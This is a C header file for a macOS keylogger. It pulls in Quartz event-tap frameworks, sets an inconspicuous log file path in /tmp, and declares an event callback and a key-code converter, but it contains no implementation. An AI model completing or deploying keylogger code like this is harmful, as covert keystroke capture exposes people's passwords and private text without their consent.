#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <stdbool.h>
#include <time.h>
#include <utime.h>
#include <string.h>
#include <sys/types.h>
#include <ApplicationServices/ApplicationServices.h>

#include <Carbon/Carbon.h>
// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html

const char *logfileLocation = "/tmp/rest_dummy";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
const char *convertKeyCode(int, bool, bool);

#endif
